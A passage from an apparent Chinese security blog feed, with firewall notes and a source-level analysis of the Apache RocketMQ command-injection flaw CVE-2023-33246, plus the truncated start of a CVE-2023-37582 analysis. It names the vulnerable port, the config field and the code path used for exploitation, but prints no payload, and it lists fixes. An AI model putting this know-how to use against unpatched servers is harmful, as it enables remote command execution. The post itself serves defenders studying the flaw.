<p>加密算法在so里怎么办，混淆了无法自己实现怎么办</p>
</blockquote>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>防火墙</title>
    <url>/archives/9c75190f.html</url>
    <content><![CDATA[<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>防火墙一般不能防止病毒，只负责过滤流量，一般普遍的是二三四层的防火墙，基于ip\端口号等进行流量过滤，能有效防火ddos攻击。防火墙兼具路由、vpn等功能</p>
<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a><strong>类型</strong></h2><ol>
<li>代理防火墙<ol>
<li>防火墙作为一个代理，内网流量到达防火墙之后，防火墙回复源主机，目标已到达，并同时修改源ip地址对数据包进行代理转发。整个是透明的</li>
</ol>
</li>
<li>状态检测防火墙<ol>
<li>当内网流量到达后，防火墙检查状态信息，发现没有匹配的状态，于是检查策略，发现该流量是允许通过的，于是记录源ip目标ipP源端口号目标端口号保存作为一条状态消息，然后检查路由表、nat地址池等记录关键信息作为状态，然后将流量进行放行。</li>
<li>当流量回来后，防火墙首先进行状态匹配，若成功则通过该状态中存储的信息对数据进行装法，而不必在检查策略、检查路由表等操作。</li>
</ol>
</li>
<li>DPI 深度包检测技术</li>
<li>IPS 入侵防御系统 -应用层防火墙<ol>
<li>检测并处理</li>
<li>通过特征库来对流量进行过滤</li>
</ol>
</li>
<li>IDS 入侵检测系统 -应用层防火墙<ol>
<li>只做检测，不做处理，通常使用旁路安装，将经的流量复制一份进行检测，是透明的。</li>
<li>通过特征库来对流量进行过滤</li>
</ol>
</li>
<li>waf web应用防火墙<ol>
<li>只针对web应用进行检测</li>
</ol>
</li>
<li>用户行为防火墙<ol>
<li>检查当前用户的上网行为，对用户上网行为进行监控，控制用户的访问情况，包括能访问那些网站，能使用那些应用，不能使用那些应用等。</li>
</ol>
</li>
</ol>
<h2 id="衡量指标"><a href="#衡量指标" class="headerlink" title="衡量指标"></a><strong>衡量指标</strong></h2><ol>
<li>吞吐量</li>
<li>时延</li>
<li>丢包率</li>
<li>并发连接数：能同时处理的会话</li>
<li>新建连接数：单位时间内能同时新建的连接数</li>
</ol>
<h2 id="应用模式"><a href="#应用模式" class="headerlink" title="应用模式"></a><strong>应用模式</strong></h2><ol>
<li>透明模式：防火墙端口工作在二层端口，对整个网络来说是透明的，三个区域工作在同一个网段</li>
<li>路由模式：防火墙端口工作在三层端口，可配置nat\路由\vpn等，三个区域工作在不同的网段</li>
<li>混杂模式：连接外网的端口工作在三层，另外两个区域的端口工作在二层。也可以让外部区域与DMZ区域的几口工作在三层，DMZ区域使用公网IP，内部区域接口工作在二层。</li>
</ol>
<h2 id="区域隔离"><a href="#区域隔离" class="headerlink" title="区域隔离"></a><strong>区域隔离</strong></h2><p>一般划分为三个区域，用来配置策略</p>
<ol>
<li>DMZ	非军事化区 ，当有网站需要对外发布的时候设置该区域，该区域一般不配置向内网的策略，也就是不能访问内网，用以保证内网的安全。</li>
<li>内部区域</li>
<li>外部区域</li>
</ol>
<h2 id="HA技术-双机热备"><a href="#HA技术-双机热备" class="headerlink" title="HA技术-双机热备"></a>HA技术-双机热备</h2><p>两台防火墙，一台为主防火墙，一台为备份防火墙，两台防火墙通过心跳线连接起来，互相交换状态信息，防火墙数据。两台防火墙同一侧的ip地址一样，心跳线两头的ip地址不一样。</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>安全设备</category>
      </categories>
      <tags>
        <tag>防火墙</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache RocketMQ 远程代码执行（CVE-2023-33246）</title>
    <url>/archives/3553c506.html</url>
    <content><![CDATA[<h1 id="CVE-2023-33246"><a href="#CVE-2023-33246" class="headerlink" title="CVE-2023-33246"></a>CVE-2023-33246</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>RocketMQ是阿里巴巴在2012年开发的分布式消息中间件，后捐献给Apache软件基金会并成为Apache的顶级项目。RocketMQ专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。</p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>RocketMQ 5.1.0及以下版本，在一定条件下，存在远程命令执行风险。漏洞源于RocketMQ的NameServer、Broker、Controller等多个组件暴露在公网中且缺乏权限校验。攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行任意操作系统命令。</p>
<span id="more"></span>

<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h3><p><strong>调试环境</strong></p>
<p>访问项目官方仓库获取受影响漏洞版本源码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://github.com/apache/rocketmq/releases</span><br></pre></td></tr></table></figure>

<p>使用idea导入项目后配置运行时环境变量<code>ROCKETMQ_HOME</code></p>
<p><img src="/archives/3553c506/image-20230720155335454.png" alt="image-20230720155335454"></p>
<p><code>ROCKETMQ_HOME</code>为ROCKETMQ运行家目录，配置好环境变量后在<code>ROCKETMQ_HOME</code>指向的目录行新建文件夹<code>conf</code>，进入<code>conf</code>目录并新建文件<code>logback_broker.xml</code>，将以下内容复制到该文件中：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置文件修改时重新加载，默认true --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--定义日志文件的存储地址 勿在 LogBack 的配置中使用相对路径--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;CATALINA_BASE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;**/logs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 控制台输出 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第一个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出文件路径+文件名 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/aa.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 保存30天的日志 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第二个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CUSTOM&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- daily rollover --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- keep 30 days&#x27; worth of history --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 设置日志输出级别 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;ERROR&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 自定义logger --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;custom&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CUSTOM&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>环境配置完成后运行主类<code>org.apache.rocketmq.broker.BrokerStartup</code>启动ROCKETMQ Brocker，控制台输出以下内容则Brocker启动成功</p>
<p><img src="/archives/3553c506/image-20230720155841681.png" alt="image-20230720155841681"></p>
<p><strong>靶场搭建</strong></p>
<p>使用vulhub靶场一键搭建</p>
<p><code>https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246</code></p>
<h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>Broker在启动时会首先创建一个<code>BrokerController</code>然后运行它</p>
<p><img src="/archives/3553c506/image-20230720164935939.png" alt="image-20230720164935939"></p>
<p>BrockerController创建过程中主要进行了配置文件解析、命令行解析、网络服务配置、日志配置等操作。</p>
<p>Controller启动时相继启动以下服务，其中在启动<code>remotingServer</code>服务时会启动<code>broker</code>监听在默认的<code>10911</code>端口</p>
<p><img src="/archives/3553c506/image-20230720165303285.png" alt="image-20230720165303285"></p>
<p>在进行<code>filterServerManager</code>启动过程中会以30S的频率轮询创建<code>filterServer</code></p>
<p><img src="/archives/3553c506/image-20230720165452954.png" alt="image-20230720165452954"></p>
<p>创建<code>filterServer</code>时调用方法<code>org.apache.rocketmq.broker.filtersrv.FilterServerManager#buildStartCommand</code>解析数据拼接参数</p>
<p><img src="/archives/3553c506/image-20230720165739570.png" alt="image-20230720165739570"></p>
<p>在进行参数拼接过程中会从<code>brokerConfig</code>中获取<code>rocketmqHome</code>与<code>namesrvAddr</code>两个值。</p>
<p>我们可以通过模拟RocketMQ协议向10911端口发送特制的数据包来影响<code>rocketmqHome</code>的值为可控的值，又因应用在进行命令拼接过程中未对用户的输入值进行有效的过滤，从而导致任意命令执行，此时我们使用网络上公开的PoC向10911端口发送数据然后调试</p>
<p><img src="/archives/3553c506/image-20230720170706116.png" alt="image-20230720170706116"></p>
<p><img src="/archives/3553c506/image-20230720170558173.png" alt="image-20230720170558173"></p>
<p>可以看到，此时获取的<code>rocketmqHome</code>值已经变更为我们输入的Payload</p>
<p>在<code>buildStartCommand</code>方法调用完毕后，会返回拼接的字符串然后调用<code>org.apache.rocketmq.broker.filtersrv.FilterServerUtil#callShell</code>方法进行命令执行</p>
<p>整个流程的调用栈为</p>
<p><img src="/archives/3553c506/image-20230720171016289.png" alt="image-20230720171016289"></p>
<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><p>1、非必须勿向互联网开放不必要的服务端口，控制暴露面；</p>
<p>2、关键服务增加用户权限校验；</p>
<p>3、升级软件到不受影响的版本或最新版。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-33246">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-33246</a></li>
<li><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101</a></li>
</ul>
<h2 id="软安解决方案"><a href="#软安解决方案" class="headerlink" title="软安解决方案"></a>软安解决方案</h2>]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>Apache RocketMQ</tag>
        <tag>CVE-2023-33246</tag>
        <tag>RCE</tag>
        <tag>远程代码执行</tag>
        <tag>反序列化</tag>
        <tag>网络安全</tag>
        <tag>漏洞分析</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache RocketMQ 远程代码执行（CVE-2023-37582）</title>
    <url>/archives/968babfb.html</url>
    <content><![CDATA[<h1 id="CVE-2023-37582"><a href="#CVE-2023-37582" class="headerlink" title="CVE-2023-37582"></a>CVE-2023-37582</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>RocketMQ是阿里巴巴在2012年开发的分布式消息中间件，后捐献给Apache软件基金会并成为Apache的顶级项目。RocketMQ专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。</p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>当RocketMQ的NameServer组件暴露在外网，并且缺乏有效的身份认证机制时，攻击者可以利用nameServer更新配置功能，以RocketMQ运行的系统用户身份进行任意文件上传，甚至实现远程代码执行。</p>
<span id="more"></span>

<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt;RocketMQ 4.9.7</p>
<p>&lt;RocketMQ 5.1.2</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="RocketMQ基本概念"><a href="#RocketMQ基本概念" class="headerlink" title="RocketMQ基本概念"></a>RocketMQ基本概念</h3><p>要想对该漏洞有较为清晰的认识，我们首先要了解RocketMQ的基本架构以及各部分的功能。</p>
<p>RocketMQ主要由四部分组成：</p>
<table>
<thead>
<tr>
<th>概念</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Producer</td>
<td>Prducer负责消息的生产，支持分布式集群部署，通过MQ的负载均衡系统选择相应的Broker集群进行消息的存储与投递。</td>
</tr>
<tr>
<td>Consumer</td>
<td>Consumer负责消息的消费，支持分布式集群部署，同时支持通过PUSH与PULL的方式对消息进行消费。</td>
</tr>
<tr>
<td>NameServer</td>
<td>NameServer是一个Topic路由注册中心，其角色类似于Dubbo中的ZooKeeper，Hadoop中的NameNode，负责整个系统元数据的存储与管理，支持Broker的动态注册与发现。其主要包含两个功能。一是Broker的注册与管理，其接受Broker的信息并保存作为路由的基本信息，并提供心跳机制来确保每一个Broker集群的有效性；二是路由信息的管理，NameServer存储了整个系统的Broker路由信息，Producer与Consumer通过NameSerVer便可进行消息的投递与消费。</td>
</tr>
<tr>
<td>Broker</td>
<td>Broker主要负责消息的存储、投递与消费并保证服务的高可用。</td>
</tr>
</tbody></table>
<p>下图为各组件的关联方式：</p>
<p><img src="/archives/968babfb/image-20230724102920537.png" alt="image-20230724102920537"></p>
<h3 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h3><p><strong>调试环境</strong></p>
<p>访问项目官方仓库获取受影响漏洞版本源码（本文使用v4.9.4版本）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://github.com/apache/rocketmq/releases</span><br></pre></td></tr></table></figure>

<p>使用idea导入项目后需启动<code>NameServer</code>与<code>Broker</code>，同时为<code>BrokerStarup</code>与<code>NamesrvStartup</code>配置运行时环境变量<code>ROCKETMQ_HOME</code>，两者配置相同地址即可，为了让<code>Broker</code>能够找到<code>Namesrv</code>，<code>Broker</code>的配置中需要额外指定命令行参数<code>-c namesrv_endpoint</code></p>
<p><img src="/archives/968babfb/image-20230720155335454.png" alt="image-20230720155335454"><br><img src="/archives/968babfb/image-20230724103128881.png" alt="image-20230724103128881">  </p>
<p><code>ROCKETMQ_HOME</code>为ROCKETMQ运行家目录，配置好环境变量后在<code>ROCKETMQ_HOME</code>指向的目录行新建文件夹<code>conf</code>，进入<code>conf</code>目录并新建文件<code>logback_broker.xml</code>与<code>logback_namesrv.xml</code>，将以下内容复制到文件中：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置文件修改时重新加载，默认true --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--定义日志文件的存储地址 勿在 LogBack 的配置中使用相对路径--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;CATALINA_BASE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;**/logs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 控制台输出 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第一个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出文件路径+文件名 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/aa.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 保存30天的日志 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 输出日志记录格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 第二个文件输出,每天产生一个文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CUSTOM&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- daily rollover --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- keep 30 days&#x27; worth of history --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level 